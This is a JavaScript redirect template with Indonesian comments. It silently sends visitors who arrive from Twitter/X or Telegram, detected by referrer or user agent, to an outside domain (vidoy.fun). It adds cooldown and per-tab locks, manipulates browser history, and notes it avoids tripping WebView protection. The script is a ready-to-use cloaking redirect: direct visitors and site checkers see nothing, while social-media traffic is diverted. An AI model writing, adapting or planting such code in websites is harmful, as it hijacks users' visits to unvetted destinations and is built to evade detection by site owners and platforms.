(function () {
  try {
    // === GANTI BAGIAN INI SAJA ===
    var target = "https://vidoy.fun/tes"; // URL tujuan (WAJIB https)
    var cooldownMs = 20 * 1000;           // 20 detik (ubah jika perlu)

    if (!/^https:\/\//i.test(target)) return;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;

    // --- Deteksi sumber: Referrer + UA (Telegram/X) ---
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");

    // Telegram bisa muncul sebagai "Telegram", "Telegram-Android", "TGApp"
    var fromRef = /(t\.co|twitter\.com|t\.me|telegram\.org)/i.test(REF);
    var fromUA  = /(twitter|telegram|telegram-android|tgapp)/i.test(UA);

    // Bila referrer kosong (umum di Telegram), izinkan berdasarkan UA
    var allowed = fromRef || (!fromRef && fromUA);
    if (!allowed) return;

    // --- Anti loop per-tab + cooldown global ---
    var page = location.origin + location.pathname; // abaikan query biar konsisten
    var sessKey = "tw_tg_seen:" + page + "|" + target;
    if (sessionStorage.getItem(sessKey)) return; // sudah pernah redirect di tab ini

    var cdKey = "redirCooldown:" + page + "|" + target + "|tw_tg";
    var now   = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return; // masih dalam cooldown

    // Lock dulu (kalau balik/reload nggak trigger lagi)
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // --- Bantalan history supaya tab nggak “hilang” saat balik dari app/browser ---
    try {
      history.pushState({ hold: 1 }, "", location.href);
      // Kalau masih “hilang”, boleh aktifkan lapis kedua:
      // history.pushState({ hold: 2 }, "", location.href);
    } catch(_) {}

    // --- Redirect otomatis (tanpa klik) ---
    // Hindari replace(); cukup href agar ada jejak di history
    // Gunakan satu tembakan agar tidak memicu proteksi WebView
    location.href = target;

  } catch (_) {}
})();
